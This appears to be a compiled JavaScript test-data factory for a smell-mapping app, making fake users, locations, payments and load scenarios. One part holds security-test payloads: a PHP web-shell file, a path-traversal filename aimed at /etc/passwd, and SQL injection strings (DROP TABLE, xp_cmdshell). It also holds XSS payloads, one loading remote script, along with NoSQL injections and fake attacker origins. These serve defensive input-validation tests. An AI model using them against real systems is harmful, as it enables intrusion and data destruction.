"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.TestDataFactory = void 0;
const zh_CN_1 = require("@faker-js/faker/locale/zh_CN");
class TestDataFactory {
    createUser(overrides = {}) {
        return {
            id: zh_CN_1.faker.string.uuid(),
            email: zh_CN_1.faker.internet.email(),
            username: zh_CN_1.faker.internet.username(),
            password: 'TestPassword123!',
            role: 'user',
            avatar: zh_CN_1.faker.image.avatar(),
            bio: zh_CN_1.faker.lorem.paragraph(),
            location: zh_CN_1.faker.location.city(),
            createdAt: zh_CN_1.faker.date.past(),
            updatedAt: zh_CN_1.faker.date.recent(),
            ...overrides
        };
    }
    createUserRegistrationData(overrides = {}) {
        return {
            email: zh_CN_1.faker.internet.email(),
            username: zh_CN_1.faker.internet.username(),
            password: 'TestPassword123!',
            confirmPassword: 'TestPassword123!',
            agreeToTerms: true,
            ...overrides
        };
    }
    createAnnotationData(overrides = {}) {
        const smellTypes = ['industrial', 'domestic', 'natural', 'chemical', 'food', 'waste'];
        const descriptions = [
            '工业废气味道很浓',
            '垃圾处理站附近的恶臭',
            '化工厂排放的刺鼻气味',
            '餐厅油烟味道',
            '下水道异味',
            '汽车尾气味道'
        ];
        return {
            latitude: parseFloat(zh_CN_1.faker.location.latitude({ min: 31.1, max: 31.4, precision: 6 })),
            longitude: parseFloat(zh_CN_1.faker.location.longitude({ min: 121.3, max: 121.6, precision: 6 })),
            smellType: zh_CN_1.faker.helpers.arrayElement(smellTypes),
            intensity: zh_CN_1.faker.number.int({ min: 1, max: 5 }),
            description: zh_CN_1.faker.helpers.arrayElement(descriptions),
            images: [],
            verified: zh_CN_1.faker.datatype.boolean(),
            tags: zh_CN_1.faker.helpers.arrayElements(['工业污染', '环境问题', '需要关注'], { min: 0, max: 3 }),
            ...overrides
        };
    }
    createLocationData(overrides = {}) {
        return {
            latitude: parseFloat(zh_CN_1.faker.location.latitude({ min: -90, max: 90, precision: 6 })),
            longitude: parseFloat(zh_CN_1.faker.location.longitude({ min: -180, max: 180, precision: 6 })),
            accuracy: zh_CN_1.faker.number.int({ min: 1, max: 100 }),
            altitude: zh_CN_1.faker.number.int({ min: -100, max: 8000 }),
            heading: zh_CN_1.faker.number.int({ min: 0, max: 360 }),
            speed: zh_CN_1.faker.number.float({ min: 0, max: 50, precision: 0.1 }),
            timestamp: Date.now(),
            ...overrides
        };
    }
    createSuspiciousLocationData(overrides = {}) {
        const suspiciousPatterns = [
            { latitude: 31.2304, longitude: 121.4737, accuracy: 1 },
            { latitude: 31.2304, longitude: 121.4737, speed: 200 },
            { latitude: 31.2304, longitude: 121.4737, accuracy: 0.1 },
            { latitude: 31.230400, longitude: 121.473700, accuracy: 5 }
        ];
        return zh_CN_1.faker.helpers.arrayElement(suspiciousPatterns);
    }
    createLocationAtDistance(baseLat, baseLng, distanceMeters) {
        const earthRadius = 6371000;
        const dLat = distanceMeters / earthRadius;
        const dLng = distanceMeters / (earthRadius * Math.cos(baseLat * Math.PI / 180));
        return {
            latitude: baseLat + (dLat * 180 / Math.PI),
            longitude: baseLng + (dLng * 180 / Math.PI),
            accuracy: zh_CN_1.faker.number.int({ min: 5, max: 20 }),
            timestamp: Date.now()
        };
    }
    createPaymentData(overrides = {}) {
        return {
            amount: zh_CN_1.faker.number.float({ min: 1, max: 100, precision: 0.01 }),
            currency: 'cny',
            paymentMethod: zh_CN_1.faker.helpers.arrayElement(['card', 'alipay', 'wechat']),
            description: zh_CN_1.faker.commerce.productDescription(),
            metadata: {
                userId: zh_CN_1.faker.string.uuid(),
                annotationId: zh_CN_1.faker.string.uuid()
            },
            ...overrides
        };
    }
    createCommentData(overrides = {}) {
        return {
            content: zh_CN_1.faker.lorem.sentences(zh_CN_1.faker.number.int({ min: 1, max: 3 })),
            parentId: null,
            mentions: [],
            images: [],
            ...overrides
        };
    }
    createChatMessageData(overrides = {}) {
        return {
            message: zh_CN_1.faker.lorem.sentence(),
            roomId: zh_CN_1.faker.string.uuid(),
            timestamp: Date.now(),
            type: 'text',
            ...overrides
        };
    }
    createFileData(overrides = {}) {
        const fileTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
        const extensions = ['jpg', 'png', 'gif', 'webp'];
        const type = zh_CN_1.faker.helpers.arrayElement(fileTypes);
        const extension = extensions[fileTypes.indexOf(type)];
        return {
            filename: `${zh_CN_1.faker.lorem.word()}.${extension}`,
            mimetype: type,
            size: zh_CN_1.faker.number.int({ min: 1024, max: 5 * 1024 * 1024 }),
            buffer: Buffer.from(zh_CN_1.faker.lorem.paragraphs()),
            ...overrides
        };
    }
    createMaliciousFileData(type = 'executable') {
        const maliciousFiles = {
            executable: {
                filename: 'virus.exe',
                mimetype: 'application/octet-stream',
                buffer: Buffer.from('MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00')
            },
            script: {
                filename: 'malicious.php',
                mimetype: 'application/x-php',
                buffer: Buffer.from('<?php system($_GET["cmd"]); ?>')
            },
            oversized: {
                filename: 'large_file.jpg',
                mimetype: 'image/jpeg',
                size: 100 * 1024 * 1024,
                buffer: Buffer.alloc(100 * 1024 * 1024)
            },
            path_traversal: {
                filename: '../../../etc/passwd',
                mimetype: 'text/plain',
                buffer: Buffer.from('root:x:0:0:root:/root:/bin/bash')
            }
        };
        return maliciousFiles[type];
    }
    createSQLInjectionPayloads() {
        return [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' OR 1=1 --",
            "'; UPDATE users SET password='hacked' WHERE username='admin'; --",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin') --",
            "'; DELETE FROM annotations; --",
            "' OR username LIKE '%admin%' --",
            "\"; DROP DATABASE smellpin; --",
            "' AND 1=(SELECT COUNT(*) FROM tabname); --",
            "' AND 1=CONVERT(int, (SELECT TOP 1 username FROM users)); --",
            "' WAITFOR DELAY '00:00:05' --",
            "'; EXEC xp_cmdshell('net user'); --"
        ];
    }
    createXSSPayloads() {
        return [
            '<script>alert("XSS")</script>',
            '<img src="x" onerror="alert(\'XSS\')">',
            '<svg onload="alert(\'XSS\')">',
            'javascript:alert("XSS")',
            '<iframe src="javascript:alert(\'XSS\')"></iframe>',
            '<div onmouseover="alert(\'XSS\')">Hover me</div>',
            '<input type="text" onfocus="alert(\'XSS\')" autofocus>',
            '<body onload="alert(\'XSS\')">',
            '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
            '"><script>alert("XSS")</script>',
            '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";',
            '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
            '<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>',
            '<<SCRIPT>alert("XSS");//<</SCRIPT>',
            '<img src="javascript:alert(\'XSS\')">'
        ];
    }
    createNoSQLInjectionPayloads() {
        return [
            { "$ne": null },
            { "$gt": "" },
            { "$where": "function() { return true; }" },
            { "$regex": ".*" },
            { "$or": [{ "password": { "$regex": ".*" } }, { "username": { "$regex": ".*" } }] },
            { "$nin": [] },
            { "$exists": true },
            { "$type": 2 },
            { "$mod": [1, 0] },
            { "$all": [] }
        ];
    }
    createCSRFTestData() {
        return {
            maliciousOrigins: [
                'https://malicious-site.com',
                'http://localhost:3000.evil.com',
                'data:text/html,<script>alert("XSS")</script>',
                'javascript:alert("XSS")',
                'https://attacker.example.com'
            ],
            maliciousReferers: [
                'https://malicious-site.com/csrf-attack',
                'http://evil.example.com/steal-data',
                'https://phishing-site.net/fake-login'
            ]
        };
    }
    createPerformanceTestData(count = 100) {
        return Array.from({ length: count }, () => ({
            annotations: this.createAnnotationData(),
            user: this.createUser(),
            comment: this.createCommentData(),
            location: this.createLocationData()
        }));
    }
    createLoadTestScenarios() {
        return {
            lightLoad: {
                duration: 60000,
                concurrentUsers: 10,
                requestsPerSecond: 5
            },
            mediumLoad: {
                duration: 300000,
                concurrentUsers: 50,
                requestsPerSecond: 20
            },
            heavyLoad: {
                duration: 600000,
                concurrentUsers: 100,
                requestsPerSecond: 50
            },
            spikeLoad: {
                duration: 30000,
                concurrentUsers: 200,
                requestsPerSecond: 100
            },
            stressTest: {
                duration: 900000,
                concurrentUsers: 500,
                requestsPerSecond: 200
            }
        };
    }
    createBoundaryTestData() {
        return {
            coordinates: {
                valid: [
                    { latitude: 90, longitude: 180 },
                    { latitude: -90, longitude: -180 },
                    { latitude: 0, longitude: 0 }
                ],
                invalid: [
                    { latitude: 91, longitude: 0 },
                    { latitude: -91, longitude: 0 },
                    { latitude: 0, longitude: 181 },
                    { latitude: 0, longitude: -181 },
                    { latitude: 'invalid', longitude: 'invalid' },
                    { latitude: null, longitude: null }
                ]
            },
            strings: {
                empty: '',
                short: 'a',
                medium: 'a'.repeat(100),
                long: 'a'.repeat(1000),
                veryLong: 'a'.repeat(10000),
                unicode: '测试中文字符🎉',
                special: '!@#$%^&*()_+-={}[]|\\:";\'<>?,./',
                null: null,
                undefined: undefined
            },
            numbers: {
                zero: 0,
                negative: -1,
                positive: 1,
                float: 3.14159,
                largeInt: Number.MAX_SAFE_INTEGER,
                smallInt: Number.MIN_SAFE_INTEGER,
                infinity: Infinity,
                negativeInfinity: -Infinity,
                nan: NaN
            }
        };
    }
    createTimezoneTestData() {
        const timezones = [
            'UTC',
            'America/New_York',
            'Europe/London',
            'Asia/Shanghai',
            'Asia/Tokyo',
            'Australia/Sydney',
            'Pacific/Auckland'
        ];
        return timezones.map(timezone => ({
            timezone,
            timestamp: new Date().toLocaleString('en-US', { timeZone: timezone }),
            offset: new Date().getTimezoneOffset()
        }));
    }
    createMultiLanguageTestData() {
        return {
            chinese: '这是中文测试数据',
            english: 'This is English test data',
            japanese: 'これは日本語のテストデータです',
            korean: '이것은 한국어 테스트 데이터입니다',
            arabic: 'هذه بيانات اختبار باللغة العربية',
            emoji: '测试表情符号 🚀 🎉 💯',
            mixed: 'Mixed语言test数据😀'
        };
    }
    createConcurrencyTestData(scenarios = 5) {
        return Array.from({ length: scenarios }, (_, index) => ({
            scenarioId: index + 1,
            users: Array.from({ length: 10 + index * 5 }, () => this.createUser()),
            annotations: Array.from({ length: 20 + index * 10 }, () => this.createAnnotationData()),
            requests: Array.from({ length: 50 + index * 25 }, () => ({
                endpoint: zh_CN_1.faker.helpers.arrayElement([
                    '/api/v1/annotations/list',
                    '/api/v1/annotations/nearby',
                    '/api/v1/users/profile/me',
                    '/api/v1/annotations',
                    '/api/v1/users/stats'
                ]),
                method: zh_CN_1.faker.helpers.arrayElement(['GET', 'POST', 'PUT', 'DELETE']),
                delay: zh_CN_1.faker.number.int({ min: 0, max: 1000 })
            }))
        }));
    }
}
exports.TestDataFactory = TestDataFactory;
//# sourceMappingURL=test-data-factory.js.map